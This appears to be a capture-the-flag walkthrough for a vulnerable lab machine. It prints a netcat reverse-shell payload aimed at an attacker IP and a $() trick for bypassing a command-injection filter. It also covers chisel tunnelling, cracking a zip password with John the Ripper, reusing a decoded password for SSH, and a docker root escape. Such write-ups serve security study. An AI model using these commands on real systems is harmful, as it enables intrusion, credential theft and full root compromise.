### Wakthrough:

- Spot the ip of the victim machine with `netdiscover -r <eth0 ip>`, to get our host machine's ip, use `ip a | grep "eth0"`

- Rustscan's result for open ports,use `rustscan -a [victim's ip] -- -sC -sV`,flag `-sV` is used for port service detection

- Ffuf's result for directory fuzzing after using wordlist `big.txt`

  ![image](https://github.com/user-attachments/assets/235c0f84-b0e0-47c6-93d0-a5b8b43de550)

- The webserver contains a page `secret`,I tested the site for shell command injection, i noticed it filters linux shell commands.I tested with `ls`
  and got this alert page

 
 ![image](https://github.com/user-attachments/assets/b9835310-bc20-419c-bca1-d90d3520a537)

- I bypassed the filters by enclosing the linux statement with `$()` e.g `$(ls)`. To test it, I set up a listner with nc and got a payload from
`revshells.com` to activate a reverse shell. Now we have shell access to `www-data`

  Payload: `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc [Attacker'sip] [nc listener's port] >/tmp/f`

  ![image](https://github.com/user-attachments/assets/188f3c98-6c02-43dd-9a00-22fdc49bb057)

- Stabilize the shell with the instructions below
  `python3 -c "import pty;pty.spawn('/bin/bash')"
   ctrl + z {to make it a backround process}
   stty raw -echo;fg
   export TERM=XTERM`
  
  ![image](https://github.com/user-attachments/assets/9f757f47-2f93-46bf-a798-252397d3ec67)

- After runnng `netstat -antp` to check services running on the victim machine. I noticed a page was running on localhost:9001 which is
a customer page.

  ![image](https://github.com/user-attachments/assets/55c1d7c2-ca3c-44cb-b2fc-dead8e43a4b4)

- We can make it available on our machine by port forwarding it with chisel, but our first task  is to send the chisel binary from
our attacker machine.Set up a python http server with this command `python -m http.server 8000` in the director chisel is located.

 ![image](https://github.com/user-attachments/assets/cbd6da90-440f-49eb-9869-aec6ec00d198)

- Receive with `wget http://[host'sip]:[http server'sport]/[binary's name]`, it should be noted that we can only write files to directories like `/dev/shm` and `/tmp` in the victim's machine. I'll be writing to /tmp.The next step is to grant the binary with
`chmod +x {binary}` to grant execute permissions.

  ![image](https://github.com/user-attachments/assets/0871e405-846a-43e1-8373-d5837863995a)--

-  Set up a server with `chisel server -p [port] --reverse` on your target machine

  ![image](https://github.com/user-attachments/assets/1d197c0f-d4de-40b5-9ffe-368cb5663647)

- We have to set up a client on the victim's machine with `./chisel client [attacker'sip]:[chisel's server port] R:[port that you want to tunnel through]:[localhost]:[port running the service internally]`.After executing, the client should communicate with our server.

   `./chisel client 192.168.184.129:8002 R:8003:127.0.0.1:9001`

- Fuzzing for web directories and files with ffuf reveals an images directories.

  ![image](https://github.com/user-attachments/assets/a41b2238-849d-493e-98d1-566209ad6072)

- The `images/` directories contains a gif and jpg images.I decided to perform steganography on the jpg file to check if the file is within the jpg file.

  ![image](https://github.com/user-attachments/assets/a4603504-669c-4586-9d49-5a56f7dc6b2d)

- Download the file to your machine with wget and use `stegseek` to crack the jpg file passphrase

  ![image](https://github.com/user-attachments/assets/75d02ae7-b8a4-43f0-962f-913fad045fd6)

- The jpg file was not password protected and it contains a backup.zip file but the zip file is password protected

  ![image](https://github.com/user-attachments/assets/09c011b2-4f42-41ea-b5b7-526b765631d0)

- I cracked the zip wit `John the ripper` but the fist process is to recover the hash with `zip2john [zipfile] > hashfile`.Then, crack with `john --wordlist=[probably rockyou] hash`. Since I have cracked the password before, I used option `--show` to show the password.

  ![image](https://github.com/user-attachments/assets/9d9f461a-fe4b-492f-926a-27c667afcb9b)

- Use `unzip [file]` to unzip the zip archive. The file contains a php file code which reveals a b64 encoded password.

   ![image](https://github.com/user-attachments/assets/87babf44-ed57-46fa-9d87-308e4ee32bd4)
    

- The value of the base64 encoded string is ``.To decode the string,use `echo "base64string" | base64 -d`.

        ❯ echo "IWQwbnRLbjB3bVlwQHNzdzByZA==" | base64 -d
         !d0ntKn0wmYp@ssw0rd
      
- I was unable to get the authentication page, I decided to test the password `!d0ntKn0wmYp@ssw0rd` on the ssh user `anurodh` and I got ssh access to the user anurodh

### Privilege Escalation with Docker

-  User `anurodh` is under the group, we can run a privileged container and breakout as root.

  ![image](https://github.com/user-attachments/assets/af0baaf1-532b-44db-ae17-4c567aa4351e)

- I got a payload from <a href="https://gtfobins.github.io/gtfobins/docker/">gtfobins</a> to escalate privileges

  Payload: `docker run -v /:/mnt --rm -it alpine chroot /mnt bash`
